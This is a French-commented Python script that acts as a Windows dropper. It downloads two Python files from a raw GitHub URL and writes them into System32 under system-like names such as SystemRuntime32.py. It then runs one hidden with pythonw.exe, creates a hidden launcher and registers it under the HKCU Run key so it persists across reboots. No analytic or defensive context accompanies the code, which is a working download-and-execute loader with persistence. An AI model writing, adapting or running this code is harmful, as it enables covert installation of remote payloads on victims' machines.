import os
import winreg
import requests
import subprocess
import time

SYSTEM32 = r"C:\Windows\System32"
LAUNCHER_NAME = "winlauncher_hidden.py"
RUN_KEY_NAME = "WinLauncherHidden"

URLS = {
    "wmihelper.py": "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/wmihelper.py",
    "SystemRuntime32.py": "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/SystemRuntime32.py",
}


def download_and_save(filename, url):
    print(f"[i] Téléchargement de {filename} depuis {url} ...")
    try:
        response = requests.get(url, timeout=15)
        response.raise_for_status()
    except Exception as e:
        print(f"[!] Erreur téléchargement {filename}: {e}")
        return False

    target_path = os.path.join(SYSTEM32, filename)
    try:
        with open(target_path, "w", encoding="utf-8") as f:
            f.write(response.text)
    except Exception as e:
        print(f"[!] Erreur écriture fichier {target_path}: {e}")
        return False

    # Vérification simple
    if not os.path.isfile(target_path) or os.path.getsize(target_path) == 0:
        print(f"[!] Fichier {target_path} absent ou vide après écriture.")
        return False

    print(f"[✓] {filename} téléchargé et sauvegardé dans {target_path}")
    return target_path


def download_all_scripts():
    saved_paths = {}
    for filename, url in URLS.items():
        path = download_and_save(filename, url)
        if not path:
            print("[!] Échec téléchargement, arrêt.")
            return None
        saved_paths[filename] = path
        time.sleep(1)
    return saved_paths


def run_script(path):
    print(f"[i] Lancement de {path} en arrière-plan...")
    try:
        subprocess.Popen(['pythonw.exe', path], close_fds=True)
        print(f"[✓] Script {path} lancé.")
    except Exception as e:
        print(f"[!] Erreur lancement {path} : {e}")


def create_launcher():
    launcher_code = f"""import subprocess
import os
subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')], close_fds=True)
"""
    launcher_path = os.path.join(SYSTEM32, LAUNCHER_NAME)
    try:
        with open(launcher_path, "w", encoding="utf-8") as f:
            f.write(launcher_code)
        print(f"[✓] Launcher créé : {launcher_path}")
        return launcher_path
    except Exception as e:
        print(f"[!] Erreur création launcher : {e}")
        return None


def add_to_startup(py_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f'pythonw.exe "{py_path}"')
        print("[✓] Script ajouté au démarrage.")
    except Exception as e:
        print(f"[!] Erreur ajout au démarrage : {e}")


def main():
    # Vérification des droits administrateur (écriture dans SYSTEM32)
    if not os.access(SYSTEM32, os.W_OK):
        print("[!] Ce script doit être exécuté avec des droits administrateur.")
        return

    print("[i] Téléchargement des scripts...")
    paths = download_all_scripts()
    if not paths:
        return

    # Lancement du script principal SystemRuntime32.py
    if "SystemRuntime32.py" in paths:
        run_script(paths["SystemRuntime32.py"])
    else:
        print("[!] SystemRuntime32.py non trouvé, impossible de lancer.")

    # Création launcher et ajout au démarrage
    launcher_path = create_launcher()
    if launcher_path:
        add_to_startup(launcher_path)

    print("[✓] Script terminé.")


if __name__ == "__main__":
    main()
